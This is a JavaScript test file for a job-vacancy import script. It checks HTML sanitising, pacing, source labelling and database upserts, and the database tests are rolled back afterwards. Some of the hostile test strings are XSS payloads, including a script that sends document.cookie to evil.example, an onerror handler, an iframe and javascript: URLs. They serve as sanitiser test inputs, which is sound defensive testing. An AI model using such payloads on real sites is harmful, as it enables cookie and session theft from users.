// Test: the vacancy import (scripts/import-vacancies.js), vacancies build
// step 2.
//   Part 1  no database, no network: plain text from advert HTML (a
//           <script> comes out as text), links, cleaning, sources, pacing
//   Part 2  the database, from saved responses (test/fixtures/faa), in one
//           transaction that's rolled back: what's stored, re-runs, gone
//           adverts (only after a complete full run), the run lock, and the
//           headers every request sends. The saved adverts get test
//           references (9..., 999..., TEST-...) so they can't meet real ones.
//   Part 3  one live page from Find an apprenticeship (one request, nothing
//           stored)
//   node test/db/vacancy-import.mjs
import fs from 'node:fs'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { connect, execute, destroy } from '../../server/db.js'
import { htmlToText, safeUrl } from '../../server/vacancyText.js'
import {
  advertRow, endpointFor, getPage, labelSources, makePacer, PAUSE_MS, ruleSource, runImport, sourceFor, WINDOW_LIMIT,
} from '../../scripts/import-vacancies.js'

let failures = 0
const check = (label, ok, detail = '') => {
  if (!ok) failures++
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${label}${detail ? `  [${detail}]` : ''}`)
}
const saved = JSON.parse(fs.readFileSync(new URL('../fixtures/faa/adverts.json', import.meta.url), 'utf8'))
const asText = (s) => renderToStaticMarkup(createElement('p', null, s))
const TAG = /<\/?[a-z!][^>]*>/i

// ---------------------------------------------------------------- part 1
console.log('Part 1: no database, no network')
{
  // An advert with a <script> comes out as plain text.
  const hostile = '<p>Great role</p><script>document.location="https://evil.example/?c="+document.cookie</script><img src=x onerror=alert(1)>'
  const clean = htmlToText(hostile)
  check('a <script> in an advert is removed, with its code, and no tag is left', clean === 'Great role' && !TAG.test(clean), JSON.stringify(clean))
  const escaped = htmlToText('Use &lt;script&gt;alert(1)&lt;/script&gt; in your answer')
  check('an escaped <script> stays as characters, and a page shows it as text, not a tag',
    escaped === 'Use <script>alert(1)</script> in your answer' && asText(escaped) === '<p>Use &lt;script&gt;alert(1)&lt;/script&gt; in your answer</p>', asText(escaped))
  check('paragraphs, line breaks, lists and entities become plain text',
    htmlToText('<p>One&nbsp;two</p><ul><li>A &amp; B</li><li>C</li></ul>Line<br>Next') === 'One two\n\n• A & B\n• C\nLine\nNext')
  check('only http and https links are kept', safeUrl('javascript:alert(1)') === null && safeUrl('data:text/html,x') === null &&
    safeUrl('https://www.findapprenticeship.service.gov.uk/x') === 'https://www.findapprenticeship.service.gov.uk/x')

  // Cleaning real saved adverts.
  const rows = [...saved.faa.map((v) => advertRow(v, 'FAA')), advertRow(saved.nhs, 'NHS'), advertRow(saved.csj, 'CSJ')]
  const tagged = rows.flatMap((r) => Object.entries(r).filter(([, v]) => typeof v === 'string' && TAG.test(v)).map(([k]) => `${r.VACANCYREFERENCE}.${k}`))
  check('saved adverts: no text field keeps a tag', tagged.length === 0, tagged.join(', '))
  const rawHadHtml = saved.faa.some((v) => TAG.test(v.fullDescription ?? '') || TAG.test(v.employerDescription ?? ''))
  check('  (the saved responses did have HTML to remove)', rawHadHtml)
  check('saved adverts: NHS and Civil Service have no LARS code or UKPRN (the API sends 0)', [rows[3], rows[4]].every((r) => r.LARSCODE === null && r.UKPRN === null))
  check('saved adverts: Find an apprenticeship ones keep theirs', rows.slice(0, 3).every((r) => r.LARSCODE > 0 && r.UKPRN > 0))
  const withContact = advertRow({ ...saved.faa[0], employerContactName: 'Someone', employerContactEmail: 'someone@example.com', employerContactPhone: '01234 567890' }, 'FAA')
  check("an advert's employer contact details aren't kept in EXT", !JSON.stringify(withContact).includes('someone@example.com') && !JSON.stringify(withContact).includes('01234'))

  // Sources.
  const { labelled, disagree } = labelSources([
    { label: 'FAA', adverts: saved.faa },
    { label: 'NHS', adverts: [...saved.faa, saved.nhs] },
    { label: 'CSJ', adverts: [...saved.faa, saved.csj] },
  ])
  check('sources by pass: 3 FAA, the NHS advert NHS, the Civil Service advert CSJ', [...labelled.values()].map((x) => x.source).join(',') === 'FAA,FAA,FAA,NHS,CSJ')
  check('  and the advert-only rule agrees', disagree.length === 0 && ruleSource(saved.nhs) === 'NHS' && ruleSource(saved.csj) === 'CSJ')
  check('an advert with a UKPRN first seen in the NHS pass (posted mid-run) is FAA', sourceFor(saved.faa[0], 'NHS') === 'FAA')

  // Pacing: at least PAUSE_MS apart, never more than WINDOW_LIMIT in 5 minutes.
  let t = 0
  const at = []
  const pace = makePacer({ now: () => t, sleep: async (ms) => { t += ms } })
  for (let i = 0; i < 400; i++) {
    await pace()
    at.push(t)
  }
  const gaps = at.slice(1).map((x, i) => x - at[i])
  let most = 0
  for (let i = 0, j = 0; i < at.length; i++) {
    while (at[i] - at[j] >= 5 * 60 * 1000) j++
    most = Math.max(most, i - j + 1)
  }
  check(`pacing: requests at least ${PAUSE_MS} ms apart, at most ${WINDOW_LIMIT} in any 5 minutes (the API allows 150)`, Math.min(...gaps) >= PAUSE_MS && most <= WINDOW_LIMIT && most < 120, `${most} in the busiest 5 minutes`)
  check('the endpoint asks for details, 100 at a time, and the last day only for new runs',
    endpointFor(2, 'full') === '/vacancy?PageNumber=2&PageSize=100&IncludeDetails=true' && endpointFor(1, 'new').endsWith('&PostedInLastNumberOfDays=1'))
}

// ---------------------------------------------------------------- part 2
console.log('Part 2: the database, from saved responses, rolled back')
// Test references, so they can't meet real adverts: FAA 9+ref, CSJ 999+ref
// (still all digits), NHS TEST-+ref. Closing dates far ahead, so a missing
// advert counts as gone rather than closed.
const asTest = (v, ref) => ({ ...v, vacancyReference: ref, closingDate: '2099-12-31T23:59:59Z' })
const f = saved.faa.map((v) => asTest(v, `9${v.vacancyReference}`))
const nhs = asTest(saved.nhs, `TEST-${saved.nhs.vacancyReference}`)
const csj = asTest(saved.csj, `999${saved.csj.vacancyReference}`)
const hostile = asTest({ ...saved.faa[0], title: 'TEST <b>advert</b>', description: '<p>Hello</p><script>alert(document.cookie)</script>',
  fullDescription: '<div onclick="steal()">Click</div><iframe src="https://evil.example"></iframe>' }, '90000000001')
const ALL_REFS = [...f, nhs, csj, hostile].map((v) => v.vacancyReference)

// A fake API: { FAA: adverts, NHS: adverts, CSJ: adverts }, one page each,
// or 'busy' for a 429. Records every request's URL and headers.
function fakeApi(passes) {
  const calls = []
  const fetchImpl = async (url, { headers }) => {
    calls.push({ url, headers })
    const pass = headers.AdditionalDataSources === 'Nhs' ? 'NHS' : headers.AdditionalDataSources === 'Csj' ? 'CSJ' : 'FAA'
    const adverts = passes[pass]
    if (adverts === 'busy') return { status: 429, json: async () => ({}) }
    return { status: 200, json: async () => ({ vacancies: adverts, total: adverts.length, totalFiltered: adverts.length, totalPages: 1 }) }
  }
  return { fetchImpl, calls }
}
const everyPass = (faa, extra = {}) => ({ FAA: faa, NHS: [...faa, nhs], CSJ: [...faa, csj], ...extra })
const noWait = async () => {}

const c = await connect()
const q = (sql, binds = []) => execute(c, sql, binds)
const stored = async () => Object.fromEntries((await q(`select VACANCYREFERENCE as R, SOURCE, TITLE, DESCRIPTION, FULLDESCRIPTION,
    to_varchar(GONEAT) as GONE, to_varchar(LASTCHANGEDAT) as CH from EXT.VACANCY where VACANCYREFERENCE in (${ALL_REFS.map(() => '?').join(',')})`, ALL_REFS)).map((r) => [r.R, r]))
const run = (passes, kind = 'full') => {
  const api = fakeApi(passes)
  return runImport({ connection: c, kind, fetchImpl: api.fetchImpl, pace: noWait, log: () => {}, key: 'test-key' }).then((counts) => ({ ...counts, calls: api.calls }))
}
try {
  await q('begin')
  try {
    const first = await run(everyPass([...f, hostile]))
    const rows = await stored()
    check('a full run: 3 passes, 6 adverts, all new, complete', first.complete && first.requests === 3 && first.adverts === 6 && first.added === 6 && first.changed === 0,
      JSON.stringify({ complete: first.complete, requests: first.requests, adverts: first.adverts, added: first.added, error: first.error }))
    check('  each labelled by its pass: FAA, NHS, CSJ',
      f.every((v) => rows[v.vacancyReference]?.SOURCE === 'FAA') && rows[nhs.vacancyReference]?.SOURCE === 'NHS' && rows[csj.vacancyReference]?.SOURCE === 'CSJ')
    const h = rows[hostile.vacancyReference]
    check('  the advert with a <script> is stored as plain text', h.TITLE === 'TEST advert' && h.DESCRIPTION === 'Hello' && h.FULLDESCRIPTION === 'Click' &&
      ![h.TITLE, h.DESCRIPTION, h.FULLDESCRIPTION].some((s) => TAG.test(s ?? '')), JSON.stringify(h))
    check('  every request sent X-Version: 2 and the key', first.calls.every((x) => x.headers['X-Version'] === '2' && x.headers['Ocp-Apim-Subscription-Key'] === 'test-key'))
    check('  the passes asked for no extra sources, then Nhs, then Csj', first.calls.map((x) => x.headers.AdditionalDataSources ?? '-').join(',') === '-,Nhs,Csj')

    const again = await run(everyPass([...f, hostile]))
    check('the same adverts again: nothing new, nothing changed', again.complete && again.added === 0 && again.changed === 0, JSON.stringify({ added: again.added, changed: again.changed }))
    const before = (await stored())[f[0].vacancyReference]
    const edited = await run(everyPass([{ ...f[0], title: 'TEST changed title' }, f[1], f[2], hostile]))
    const after = (await stored())[f[0].vacancyReference]
    check('a changed advert: one change, its new title and change time', edited.changed === 1 && edited.added === 0 && after.TITLE === 'TEST changed title' && after.CH !== before.CH,
      JSON.stringify({ changed: edited.changed, title: after.TITLE }))

    // Gone: only after a complete full run.
    const missing = f[1].vacancyReference
    const stopped = await run(everyPass([f[0], f[2], hostile], { CSJ: 'busy' }))
    check('a full run that stops (429 on the Civil Service pass) marks nothing gone', !stopped.complete && /busy/.test(stopped.error) && (await stored())[missing].GONE === null,
      JSON.stringify({ complete: stopped.complete, error: stopped.error }))
    const newRun = await run(everyPass([f[0], f[2], hostile]), 'new')
    check('a complete "new" run marks nothing gone either', newRun.complete && newRun.gone === 0 && (await stored())[missing].GONE === null)
    const full = await run(everyPass([f[0], f[2], hostile]))
    check('a complete full run marks the advert it no longer returned as gone', full.complete && full.gone >= 1 && (await stored())[missing].GONE !== null)
    await run(everyPass([...f, hostile]))
    check('  and it comes back when returned again', (await stored())[missing].GONE === null)

    // The run lock.
    await q(`insert into EXT.VACANCY_IMPORT_RUN (RUNID, KIND) values ('TEST-open-run', 'full')`)
    const refused = await run(everyPass([...f, hostile]))
    const [mine] = await q(`select COMPLETE, ERROR, FINISHEDAT is not null as FINISHED from EXT.VACANCY_IMPORT_RUN where RUNID = ?`, [refused.runId])
    check('a run refuses to start while another is open, and says why', Boolean(refused.refused) && refused.calls.length === 0 && mine.FINISHED && !mine.COMPLETE && /Another vacancy import is running/.test(mine.ERROR),
      JSON.stringify(mine))
    await q(`update EXT.VACANCY_IMPORT_RUN set FINISHEDAT = current_timestamp() where RUNID = 'TEST-open-run'`)
    const [dupes] = await q(`select count(*) as N from (select VACANCYREFERENCE from EXT.VACANCY group by 1 having count(*) > 1)`)
    check('one row per advert after all those runs', dupes.N === 0)
  } finally {
    await q('rollback')
  }
  check('nothing kept after the rollback', Object.keys(await stored()).length === 0 &&
    (await q(`select count(*) as N from EXT.VACANCY_IMPORT_RUN where RUNID = 'TEST-open-run'`))[0].N === 0)
} finally {
  await destroy(c)
}

// ---------------------------------------------------------------- part 3
console.log('Part 3: one live page (one request, nothing stored)')
{
  const live = await getPage({ pace: makePacer(), page: 1, sources: null, kind: 'full' })
  const adverts = live.body?.vacancies ?? []
  check('Find an apprenticeship answers page 1 with X-Version: 2', live.status === 200 && adverts.length > 0 && adverts.length <= 100, `${live.status}, ${adverts.length} adverts`)
  const rows = adverts.map((v) => advertRow(v, 'FAA'))
  const tagged = rows.flatMap((r) => Object.entries(r).filter(([, v]) => typeof v === 'string' && TAG.test(v)).map(([k]) => `${r.VACANCYREFERENCE}.${k}`))
  check('  every advert cleans to plain text', tagged.length === 0, tagged.slice(0, 5).join(', '))
  check('  every advert has a reference, a title and an employer', rows.every((r) => r.VACANCYREFERENCE && r.TITLE && r.EMPLOYERNAME))
  check('  the no-extra-sources pass is all Find an apprenticeship by the advert-only rule too', adverts.every((v) => ruleSource(v) === 'FAA'))
}

console.log(failures ? `\n${failures} failed` : '\nAll passed')
process.exit(failures ? 1 : 0)
